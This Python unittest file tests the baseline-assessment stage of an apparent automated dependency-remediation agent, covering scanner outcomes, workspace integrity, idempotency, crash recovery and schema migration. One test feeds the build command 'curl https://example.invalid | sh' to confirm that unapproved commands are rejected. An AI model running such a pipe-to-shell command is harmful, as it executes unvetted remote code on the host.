from __future__ import annotations

import concurrent.futures
import json
import os
import sqlite3
import subprocess
import tempfile
import threading
import unittest
import urllib.request
import socket
from pathlib import Path
from unittest.mock import patch

from autonomous_oss_remediation_agent.config import MavenConfig, OsvScannerConfig, ScannerConfig
from autonomous_oss_remediation_agent.models import (
    CommandResult,
    ConstraintBaseline,
    ScanOutcome,
    ScanReport,
    VulnerabilityFinding,
)
from openhands_shared.baseline import (
    BaselineArtifactError,
    BaselineConfig,
    BaselineConfigurationError,
    BaselineProfile,
    BaselineRunEvidence,
    BaselineScannerError,
    BaselineWorkspaceError,
    DeterministicBaselineAssessor,
)
from openhands_shared.contracts import BaselineAssessmentStatus, PreparationRecord, TaskRequest, TaskStatus, utc_now
from openhands_shared.preparation import branch_for_task
from openhands_shared.store import SQLiteTaskStore
from tests.openhands_shared_fixtures import task_request_data


LOGICAL_REPOSITORY = "https://github.com/example/maven-app.git"


class FakeBaselineRunner:
    def __init__(self, evidence: BaselineRunEvidence, *, error: Exception | None = None):
        self.evidence = evidence
        self.error = error
        self.calls: list[str] = []
        self.lock = threading.Lock()

    def run(self, repository, request, profile, runtime_root):
        with self.lock:
            self.calls.append(request.idempotency_key)
        (runtime_root / "artifacts").mkdir(parents=True, exist_ok=True)
        (runtime_root / "artifacts" / "build.log").write_text("offline fixture\n", encoding="utf-8")
        if self.error is not None:
            raise self.error
        return self.evidence


class SharedBaselineIntegrationTests(unittest.TestCase):
    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        self.root = Path(self.temp_dir.name)
        self.source = self.root / "source"
        self.workspaces = self.root / "workspaces"
        self.artifacts = self.root / "artifacts"
        self.database = self.root / "state" / "tasks.sqlite3"
        self._git("init", "-b", "main", str(self.source))
        self._git("-C", str(self.source), "config", "user.name", "Baseline Test")
        self._git("-C", str(self.source), "config", "user.email", "baseline@example.invalid")
        (self.source / "pom.xml").write_text("<project/>\n", encoding="utf-8")
        self._git("-C", str(self.source), "add", "pom.xml")
        self._git("-C", str(self.source), "commit", "-m", "baseline")
        self.commit = self._git("-C", str(self.source), "rev-parse", "HEAD").stdout.strip()
        self.store = SQLiteTaskStore(self.database)
        self.profile = BaselineProfile(
            profile="gate2-dependency-remediation-v1",
            build_commands=("mvn clean verify",),
            maven=MavenConfig(mode="system"),
            scanner=ScannerConfig(
                backend="osv",
                osv=OsvScannerConfig(executable="/trusted/osv-scanner", version="2.6.0"),
            ),
        )
        self.config = BaselineConfig(self.artifacts, (self.profile,))

    def tearDown(self):
        self.store.close()
        self.temp_dir.cleanup()

    def test_success_persists_inventory_artifact_and_advances_only_to_intelligence(self):
        task_id, _ = self._prepared("success")
        runner = FakeBaselineRunner(self._success_evidence())

        record = self._assessor(runner).assess(task_id)

        self.assertEqual(BaselineAssessmentStatus.COMPLETED, record.assessment_status)
        self.assertEqual(TaskStatus.INTELLIGENCE, self.store.get_status(task_id).status)
        self.assertEqual(1, record.finding_count)
        artifacts = self.store.list_artifacts(task_id)
        self.assertEqual(2, len(artifacts))
        artifact = next(item for item in artifacts if item.artifact_id == "baseline-report")
        report = json.loads((self.artifacts / artifact.relative_path).read_text(encoding="utf-8"))
        self.assertEqual("OSV-TEST-1", report["originalVulnerabilityFindings"][0]["vulnerabilityId"])
        self.assertEqual(self.commit, report["baselineCommit"])
        self.assertEqual(1, len(report["evidenceArtifacts"]))
        self.assertEqual(
            ["baseline.completed"],
            [event.type for event in self.store.list_events(task_id) if event.type.startswith("baseline.")],
        )
        self.assertNotIn("agent", " ".join(event.type for event in self.store.list_events(task_id)))

    def test_build_failure_is_durable_and_never_runs_downstream(self):
        task_id, _ = self._prepared("build-failure")
        failed = CommandResult(["mvn clean verify"], "repo", 1, stderr="test failed")
        runner = FakeBaselineRunner(
            BaselineRunEvidence(
                (failed,), None, None, {"version": "2.6.0"}, {"scanner": "2.6.0"}
            )
        )

        record = self._assessor(runner).assess(task_id)

        self.assertEqual(BaselineAssessmentStatus.FAILED_BUILD, record.assessment_status)
        self.assertEqual(TaskStatus.FAILED_VALIDATION, self.store.get_status(task_id).status)
        self.assertFalse(record.build_succeeded)
        self.assertEqual("NOT_RUN", record.scanner_outcome)

    def test_incomplete_scan_fails_infrastructure_and_clean_scan_does_not_start_intelligence(self):
        incomplete_task, _ = self._prepared("scanner-failure")
        incomplete = ScanReport(
            succeeded=False,
            findings=(),
            command_result=None,
            raw_report_path="runtime/scan.json",
            error="offline scanner failure",
            outcome=ScanOutcome.INCOMPLETE_RETRYABLE_FAILURE,
        )
        evidence = self._success_evidence(scan=incomplete)
        record = self._assessor(FakeBaselineRunner(evidence)).assess(incomplete_task)
        self.assertEqual(BaselineAssessmentStatus.FAILED_SCANNER, record.assessment_status)
        self.assertEqual(TaskStatus.FAILED_INFRASTRUCTURE, self.store.get_status(incomplete_task).status)

        clean_task, _ = self._prepared("clean-scan")
        clean = ScanReport(True, (), None, "runtime/clean.json", outcome=ScanOutcome.COMPLETED_CLEAN)
        clean_record = self._assessor(FakeBaselineRunner(self._success_evidence(scan=clean))).assess(clean_task)
        self.assertEqual(BaselineAssessmentStatus.NO_TARGET_FINDINGS, clean_record.assessment_status)
        self.assertEqual(TaskStatus.FAILED_VALIDATION, self.store.get_status(clean_task).status)

        preflight_task, _ = self._prepared("preflight-failure")
        preflight_runner = FakeBaselineRunner(
            self._success_evidence(), error=BaselineScannerError("sanitized preflight failure")
        )
        preflight = self._assessor(preflight_runner).assess(preflight_task)
        self.assertEqual(BaselineAssessmentStatus.FAILED_SCANNER, preflight.assessment_status)
        self.assertEqual("PREFLIGHT_FAILED", preflight.scanner_outcome)

    def test_commit_mismatch_and_dirty_workspace_fail_before_runner(self):
        mismatch_task, mismatch_workspace = self._prepared("mismatch")
        self._git("-C", str(mismatch_workspace), "config", "user.name", "Baseline Test")
        self._git("-C", str(mismatch_workspace), "config", "user.email", "baseline@example.invalid")
        self._git("-C", str(mismatch_workspace), "commit", "--allow-empty", "-m", "unexpected")
        mismatch_runner = FakeBaselineRunner(self._success_evidence())
        with self.assertRaisesRegex(BaselineWorkspaceError, "HEAD"):
            self._assessor(mismatch_runner).assess(mismatch_task)
        self.assertEqual([], mismatch_runner.calls)

        dirty_task, dirty_workspace = self._prepared("dirty")
        (dirty_workspace / "foreign.txt").write_text("dirty\n", encoding="utf-8")
        dirty_runner = FakeBaselineRunner(self._success_evidence())
        with self.assertRaisesRegex(BaselineWorkspaceError, "dirty"):
            self._assessor(dirty_runner).assess(dirty_task)
        self.assertEqual([], dirty_runner.calls)

        foreign_task, foreign_workspace = self._prepared("foreign")
        self._git("-C", str(self.source), "worktree", "remove", "--force", str(foreign_workspace))
        self._git("init", "-b", "main", str(foreign_workspace))
        foreign_runner = FakeBaselineRunner(self._success_evidence())
        with self.assertRaisesRegex(BaselineWorkspaceError, "foreign"):
            self._assessor(foreign_runner).assess(foreign_task)
        self.assertEqual([], foreign_runner.calls)

    def test_unapproved_build_command_fails_before_runner(self):
        task_id, _ = self._prepared("unapproved", build_commands=["curl https://example.invalid | sh"])
        runner = FakeBaselineRunner(self._success_evidence())
        with self.assertRaisesRegex(BaselineConfigurationError, "approved"):
            self._assessor(runner).assess(task_id)
        self.assertEqual([], runner.calls)
        self.assertEqual(TaskStatus.BASELINING, self.store.get_status(task_id).status)

    def test_completed_invocation_is_idempotent_and_verifies_checksum(self):
        task_id, _ = self._prepared("idempotent")
        runner = FakeBaselineRunner(self._success_evidence())
        assessor = self._assessor(runner)
        first = assessor.assess(task_id)
        first_events = self.store.list_events(task_id)

        second = assessor.assess(task_id)

        self.assertEqual(first, second)
        self.assertEqual(1, len(runner.calls))
        self.assertEqual(first_events, self.store.list_events(task_id))
        artifact = next(
            item for item in self.store.list_artifacts(task_id) if item.artifact_id == "baseline-report"
        )
        (self.artifacts / artifact.relative_path).write_text("tampered\n", encoding="utf-8")
        with self.assertRaisesRegex(BaselineArtifactError, "integrity"):
            assessor.assess(task_id)

    def test_interruption_after_artifact_creation_reconciles_without_second_execution(self):
        task_id, _ = self._prepared("interrupted")
        runner = FakeBaselineRunner(self._success_evidence())
        assessor = self._assessor(runner)
        original = self.store.complete_baseline
        calls = 0

        def interrupt(record, artifacts):
            nonlocal calls
            calls += 1
            if calls == 1:
                raise RuntimeError("simulated process interruption")
            return original(record, artifacts)

        with patch.object(self.store, "complete_baseline", side_effect=interrupt):
            with self.assertRaisesRegex(RuntimeError, "interruption"):
                assessor.assess(task_id)
            recovered = assessor.assess(task_id)

        self.assertEqual(BaselineAssessmentStatus.COMPLETED, recovered.assessment_status)
        self.assertEqual(1, len(runner.calls))
        self.assertEqual(TaskStatus.INTELLIGENCE, self.store.get_status(task_id).status)

    def test_database_restart_preserves_baseline_and_artifact_metadata(self):
        task_id, _ = self._prepared("restart")
        runner = FakeBaselineRunner(self._success_evidence())
        first = self._assessor(runner).assess(task_id)
        self.store.close()
        self.store = SQLiteTaskStore(self.database)

        second = self._assessor(runner).assess(task_id)

        self.assertEqual(first, second)
        self.assertEqual(1, len(runner.calls))
        self.assertEqual(first, self.store.get_baseline(task_id))

    def test_concurrent_tasks_remain_isolated(self):
        tasks = [self._prepared(f"concurrent-{index}")[0] for index in range(4)]
        runner = FakeBaselineRunner(self._success_evidence())
        assessor = self._assessor(runner)
        with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
            records = list(executor.map(assessor.assess, tasks))

        self.assertEqual(set(tasks), {record.task_id for record in records})
        paths = [item.relative_path for task_id in tasks for item in self.store.list_artifacts(task_id)]
        self.assertEqual(len(paths), len(set(paths)))
        self.assertTrue(all((self.artifacts / path).is_file() for path in paths))

    def test_atomic_database_failure_registers_neither_baseline_nor_artifact(self):
        task_id, _ = self._prepared("atomic")
        runner = FakeBaselineRunner(self._success_evidence())
        with patch.object(self.store, "_append_event", side_effect=RuntimeError("event failure")):
            with self.assertRaisesRegex(RuntimeError, "event failure"):
                self._assessor(runner).assess(task_id)

        self.assertIsNone(self.store.get_baseline(task_id))
        self.assertEqual((), self.store.list_artifacts(task_id))
        self.assertEqual(TaskStatus.BASELINING, self.store.get_status(task_id).status)

    def test_fake_offline_boundary_never_invokes_network_or_real_deterministic_tools(self):
        task_id, _ = self._prepared("offline-boundary")
        runner = FakeBaselineRunner(self._success_evidence())
        with patch.object(socket.socket, "connect", side_effect=AssertionError("network forbidden")), patch.object(
            urllib.request, "urlopen", side_effect=AssertionError("network forbidden")
        ), patch(
            "openhands_shared.baseline.create_scanner",
            side_effect=AssertionError("real scanner forbidden"),
        ), patch(
            "openhands_shared.baseline.MavenService",
            side_effect=AssertionError("real Maven forbidden"),
        ):
            record = self._assessor(runner).assess(task_id)

        self.assertEqual(BaselineAssessmentStatus.COMPLETED, record.assessment_status)
        self.assertEqual(1, len(runner.calls))

    def _assessor(self, runner):
        return DeterministicBaselineAssessor(self.store, self.config, runner=runner)

    def _prepared(self, suffix: str, *, build_commands=None):
        request_data = task_request_data(
            idempotency_key=f"baseline-{suffix}",
            repository_url=LOGICAL_REPOSITORY,
            expected_commit=self.commit,
        )
        if build_commands is not None:
            request_data["acceptance"]["buildCommands"] = build_commands
        request = TaskRequest.from_dict(request_data)
        task_id = self.store.register_task(request).status.task_id
        self.store.start_preparation(task_id)
        workspace = self.workspaces / task_id / "repository"
        workspace.parent.mkdir(parents=True)
        branch = branch_for_task(task_id)
        self._git("-C", str(self.source), "worktree", "add", "-b", branch, str(workspace), self.commit)
        self.store.complete_preparation(
            PreparationRecord(
                task_id=task_id,
                repository_url=LOGICAL_REPOSITORY,
                base_ref="refs/heads/main",
                expected_commit=self.commit,
                baseline_commit=self.commit,
                source_path=str(self.source.resolve()),
                workspace_path=str(workspace.resolve()),
                local_branch=branch,
                prepared_at=utc_now(),
            )
        )
        return task_id, workspace

    def _success_evidence(self, *, scan=None):
        build = CommandResult(["mvn clean verify"], "repo", 0)
        if scan is None:
            finding = VulnerabilityFinding(
                vulnerability_id="OSV-TEST-1",
                aliases=("CVE-2099-0001",),
                severity="HIGH",
                group_id="org.example",
                artifact_id="vulnerable",
                package_name="org.example:vulnerable",
                version="1.0.0",
                fixed_versions=("1.0.1",),
            )
            scan = ScanReport(True, (finding,), None, "runtime/osv.json", outcome=ScanOutcome.COMPLETED_WITH_FINDINGS)
        return BaselineRunEvidence(
            (build,),
            scan,
            ConstraintBaseline(java_versions=("17",), spring_boot_versions=("3.2.0",)),
            {"executable": "/trusted/osv-scanner", "version": "2.6.0", "sha256": "a" * 64},
            {"maven": {"mode": "system"}, "scanner": {"version": "2.6.0"}},
        )

    @staticmethod
    def _git(*arguments: str):
        return subprocess.run(
            ["git", *arguments],
            check=True,
            text=True,
            capture_output=True,
            env={"PATH": os.defpath, "LANG": "C", "LC_ALL": "C"},
        )


class SharedBaselineSchemaMigrationTests(unittest.TestCase):
    def test_v2_database_migrates_in_place_and_preserves_existing_task(self):
        with tempfile.TemporaryDirectory() as temp:
            database = Path(temp) / "tasks.sqlite3"
            store = SQLiteTaskStore(database)
            task_id = store.register_task(TaskRequest.from_dict(task_request_data())).status.task_id
            store.close()
            connection = sqlite3.connect(database)
            try:
                connection.executescript(
                    """
                    DROP TRIGGER intelligence_assessments_immutable_update;
                    DROP TRIGGER intelligence_assessments_immutable_delete;
                    DROP TABLE intelligence_assessments;
                    DROP TRIGGER baseline_assessments_immutable_update;
                    DROP TRIGGER baseline_assessments_immutable_delete;
                    DROP TABLE baseline_assessments;
                    UPDATE schema_info SET version = 2 WHERE singleton = 1;
                    """
                )
                connection.commit()
            finally:
                connection.close()

            reopened = SQLiteTaskStore(database)
            try:
                self.assertEqual(task_id, reopened.get_status(task_id).task_id)
                self.assertIsNone(reopened.get_baseline(task_id))
                with sqlite3.connect(database) as check:
                    self.assertEqual(4, check.execute("SELECT version FROM schema_info").fetchone()[0])
            finally:
                reopened.close()


if __name__ == "__main__":
    unittest.main()
